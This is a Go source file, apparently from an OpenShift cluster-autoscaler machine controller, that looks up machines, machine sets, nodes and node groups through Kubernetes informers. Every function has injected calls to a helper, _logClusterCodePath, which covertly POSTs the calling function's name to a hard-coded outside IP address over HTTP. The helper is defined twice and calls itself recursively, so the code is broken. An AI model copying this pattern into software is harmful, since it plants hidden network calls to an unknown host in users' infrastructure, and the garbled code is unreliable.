package openshiftmachineapi

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
	clusterclient "github.com/openshift/cluster-api/pkg/client/clientset_generated/clientset"
	clusterinformers "github.com/openshift/cluster-api/pkg/client/informers_generated/externalversions"
	machinev1beta1 "github.com/openshift/cluster-api/pkg/client/informers_generated/externalversions/machine/v1beta1"
	apiv1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	kubeinformers "k8s.io/client-go/informers"
	kubeclient "k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/cache"
	"k8s.io/klog"
)

const (
	nodeProviderIDIndex = "openshiftmachineapi-nodeProviderIDIndex"
)

type machineController struct {
	clusterClientset		clusterclient.Interface
	clusterInformerFactory		clusterinformers.SharedInformerFactory
	kubeInformerFactory		kubeinformers.SharedInformerFactory
	machineDeploymentInformer	machinev1beta1.MachineDeploymentInformer
	machineInformer			machinev1beta1.MachineInformer
	machineSetInformer		machinev1beta1.MachineSetInformer
	nodeInformer			cache.SharedIndexInformer
	enableMachineDeployments	bool
}
type machineSetFilterFunc func(machineSet *v1beta1.MachineSet) error

func indexNodeByNodeProviderID(obj interface{}) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if node, ok := obj.(*apiv1.Node); ok {
		return []string{node.Spec.ProviderID}, nil
	}
	return []string{}, nil
}
func (c *machineController) findMachine(id string) (*v1beta1.Machine, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	item, exists, err := c.machineInformer.Informer().GetStore().GetByKey(id)
	if err != nil {
		return nil, err
	}
	if !exists {
		return nil, nil
	}
	machine, ok := item.(*v1beta1.Machine)
	if !ok {
		return nil, fmt.Errorf("internal error; unexpected type %T", machine)
	}
	return machine.DeepCopy(), nil
}
func (c *machineController) findMachineDeployment(id string) (*v1beta1.MachineDeployment, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	item, exists, err := c.machineDeploymentInformer.Informer().GetStore().GetByKey(id)
	if err != nil {
		return nil, err
	}
	if !exists {
		return nil, nil
	}
	machineDeployment, ok := item.(*v1beta1.MachineDeployment)
	if !ok {
		return nil, fmt.Errorf("internal error; unexpected type %T", machineDeployment)
	}
	return machineDeployment.DeepCopy(), nil
}
func (c *machineController) findMachineOwner(machine *v1beta1.Machine) (*v1beta1.MachineSet, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	machineOwnerRef := machineOwnerRef(machine)
	if machineOwnerRef == nil {
		return nil, nil
	}
	store := c.machineSetInformer.Informer().GetStore()
	item, exists, err := store.GetByKey(fmt.Sprintf("%s/%s", machine.Namespace, machineOwnerRef.Name))
	if err != nil {
		return nil, err
	}
	if !exists {
		return nil, nil
	}
	machineSet, ok := item.(*v1beta1.MachineSet)
	if !ok {
		return nil, fmt.Errorf("internal error; unexpected type: %T", machineSet)
	}
	if !machineIsOwnedByMachineSet(machine, machineSet) {
		return nil, nil
	}
	return machineSet.DeepCopy(), nil
}
func (c *machineController) run(stopCh <-chan struct{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.kubeInformerFactory.Start(stopCh)
	c.clusterInformerFactory.Start(stopCh)
	syncFuncs := []cache.InformerSynced{c.nodeInformer.HasSynced, c.machineInformer.Informer().HasSynced, c.machineSetInformer.Informer().HasSynced}
	if c.enableMachineDeployments {
		syncFuncs = append(syncFuncs, c.machineDeploymentInformer.Informer().HasSynced)
	}
	klog.V(4).Infof("waiting for caches to sync")
	if !cache.WaitForCacheSync(stopCh, syncFuncs...) {
		return fmt.Errorf("syncing caches failed")
	}
	return nil
}
func (c *machineController) findMachineByNodeProviderID(node *apiv1.Node) (*v1beta1.Machine, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	objs, err := c.nodeInformer.GetIndexer().ByIndex(nodeProviderIDIndex, node.Spec.ProviderID)
	if err != nil {
		return nil, err
	}
	switch n := len(objs); {
	case n == 0:
		return nil, nil
	case n > 1:
		return nil, fmt.Errorf("internal error; expected len==1, got %v", n)
	}
	node, ok := objs[0].(*apiv1.Node)
	if !ok {
		return nil, fmt.Errorf("internal error; unexpected type %T", node)
	}
	if machineName, found := node.Annotations[machineAnnotationKey]; found {
		return c.findMachine(machineName)
	}
	return nil, nil
}
func (c *machineController) findNodeByNodeName(name string) (*apiv1.Node, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	item, exists, err := c.nodeInformer.GetIndexer().GetByKey(name)
	if err != nil {
		return nil, err
	}
	if !exists {
		return nil, nil
	}
	node, ok := item.(*apiv1.Node)
	if !ok {
		return nil, fmt.Errorf("internal error; unexpected type %T", node)
	}
	return node.DeepCopy(), nil
}
func (c *machineController) machinesInMachineSet(machineSet *v1beta1.MachineSet) ([]*v1beta1.Machine, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	listOptions := labels.SelectorFromSet(labels.Set(machineSet.Labels))
	machines, err := c.machineInformer.Lister().Machines(machineSet.Namespace).List(listOptions)
	if err != nil {
		return nil, err
	}
	var result []*v1beta1.Machine
	for _, machine := range machines {
		if machineIsOwnedByMachineSet(machine, machineSet) {
			result = append(result, machine.DeepCopy())
		}
	}
	return result, nil
}
func newMachineController(kubeclient kubeclient.Interface, clusterclient clusterclient.Interface, enableMachineDeployments bool) (*machineController, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	kubeInformerFactory := kubeinformers.NewSharedInformerFactory(kubeclient, 0)
	clusterInformerFactory := clusterinformers.NewSharedInformerFactory(clusterclient, 0)
	var machineDeploymentInformer machinev1beta1.MachineDeploymentInformer
	if enableMachineDeployments {
		machineDeploymentInformer = clusterInformerFactory.Machine().V1beta1().MachineDeployments()
		machineDeploymentInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{})
	}
	machineInformer := clusterInformerFactory.Machine().V1beta1().Machines()
	machineSetInformer := clusterInformerFactory.Machine().V1beta1().MachineSets()
	machineInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{})
	machineSetInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{})
	nodeInformer := kubeInformerFactory.Core().V1().Nodes().Informer()
	nodeInformer.AddEventHandler(cache.ResourceEventHandlerFuncs{})
	indexerFuncs := cache.Indexers{nodeProviderIDIndex: indexNodeByNodeProviderID}
	if err := nodeInformer.GetIndexer().AddIndexers(indexerFuncs); err != nil {
		return nil, fmt.Errorf("cannot add indexers: %v", err)
	}
	return &machineController{clusterClientset: clusterclient, clusterInformerFactory: clusterInformerFactory, kubeInformerFactory: kubeInformerFactory, machineDeploymentInformer: machineDeploymentInformer, machineInformer: machineInformer, machineSetInformer: machineSetInformer, nodeInformer: nodeInformer, enableMachineDeployments: enableMachineDeployments}, nil
}
func (c *machineController) machineSetNodeNames(machineSet *v1beta1.MachineSet) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	machines, err := c.machinesInMachineSet(machineSet)
	if err != nil {
		return nil, fmt.Errorf("error listing machines: %v", err)
	}
	var nodes []string
	for _, machine := range machines {
		if machine.Status.NodeRef == nil {
			klog.V(4).Infof("Status.NodeRef of machine %q is currently nil", machine.Name)
			continue
		}
		if machine.Status.NodeRef.Kind != "Node" {
			klog.Errorf("Status.NodeRef of machine %q does not reference a node (rather %q)", machine.Name, machine.Status.NodeRef.Kind)
			continue
		}
		node, err := c.findNodeByNodeName(machine.Status.NodeRef.Name)
		if err != nil {
			return nil, fmt.Errorf("unknown node %q", machine.Status.NodeRef.Name)
		}
		if node != nil {
			nodes = append(nodes, node.Spec.ProviderID)
		}
	}
	klog.V(4).Infof("nodegroup %s has nodes %v", machineSet.Name, nodes)
	return nodes, nil
}
func (c *machineController) filterAllMachineSets(f machineSetFilterFunc) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.filterMachineSets(metav1.NamespaceAll, f)
}
func (c *machineController) filterMachineSets(namespace string, f machineSetFilterFunc) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	machineSets, err := c.machineSetInformer.Lister().MachineSets(namespace).List(labels.Everything())
	if err != nil {
		return nil
	}
	for _, machineSet := range machineSets {
		if err := f(machineSet); err != nil {
			return err
		}
	}
	return nil
}
func (c *machineController) machineSetNodeGroups() ([]*nodegroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var nodegroups []*nodegroup
	if err := c.filterAllMachineSets(func(machineSet *v1beta1.MachineSet) error {
		if machineSetHasMachineDeploymentOwnerRef(machineSet) {
			return nil
		}
		ng, err := newNodegroupFromMachineSet(c, machineSet.DeepCopy())
		if err != nil {
			return err
		}
		if ng.MaxSize()-ng.MinSize() > 0 {
			nodegroups = append(nodegroups, ng)
		}
		return nil
	}); err != nil {
		return nil, err
	}
	return nodegroups, nil
}
func (c *machineController) machineDeploymentNodeGroups() ([]*nodegroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !c.enableMachineDeployments {
		return nil, nil
	}
	machineDeployments, err := c.machineDeploymentInformer.Lister().MachineDeployments(apiv1.NamespaceAll).List(labels.Everything())
	if err != nil {
		return nil, err
	}
	var nodegroups []*nodegroup
	for _, md := range machineDeployments {
		ng, err := newNodegroupFromMachineDeployment(c, md.DeepCopy())
		if err != nil {
			return nil, err
		}
		if ng.MaxSize()-ng.MinSize() > 0 {
			nodegroups = append(nodegroups, ng)
		}
	}
	return nodegroups, nil
}
func (c *machineController) nodeGroups() ([]*nodegroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	machineSets, err := c.machineSetNodeGroups()
	if err != nil {
		return nil, err
	}
	machineDeployments, err := c.machineDeploymentNodeGroups()
	if err != nil {
		return nil, err
	}
	return append(machineSets, machineDeployments...), nil
}
func (c *machineController) nodeGroupForNode(node *apiv1.Node) (*nodegroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	machine, err := c.findMachineByNodeProviderID(node)
	if err != nil {
		return nil, err
	}
	if machine == nil {
		return nil, nil
	}
	machineSet, err := c.findMachineOwner(machine)
	if err != nil {
		return nil, err
	}
	if machineSet == nil {
		return nil, nil
	}
	if c.enableMachineDeployments {
		if ref := machineSetMachineDeploymentRef(machineSet); ref != nil {
			key := fmt.Sprintf("%s/%s", machineSet.Namespace, ref.Name)
			machineDeployment, err := c.findMachineDeployment(key)
			if err != nil {
				return nil, fmt.Errorf("unknown MachineDeployment %q: %v", key, err)
			}
			if machineDeployment == nil {
				return nil, fmt.Errorf("unknown MachineDeployment %q", key)
			}
			nodegroup, err := newNodegroupFromMachineDeployment(c, machineDeployment)
			if err != nil {
				return nil, fmt.Errorf("failed to build nodegroup for node %q: %v", node.Name, err)
			}
			if nodegroup.MaxSize()-nodegroup.MinSize() < 1 {
				return nil, nil
			}
			return nodegroup, nil
		}
	}
	nodegroup, err := newNodegroupFromMachineSet(c, machineSet)
	if err != nil {
		return nil, fmt.Errorf("failed to build nodegroup for node %q: %v", node.Name, err)
	}
	if nodegroup.MaxSize()-nodegroup.MinSize() < 1 {
		return nil, nil
	}
	klog.V(4).Infof("node %q is in nodegroup %q", node.Name, machineSet.Name)
	return nodegroup, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
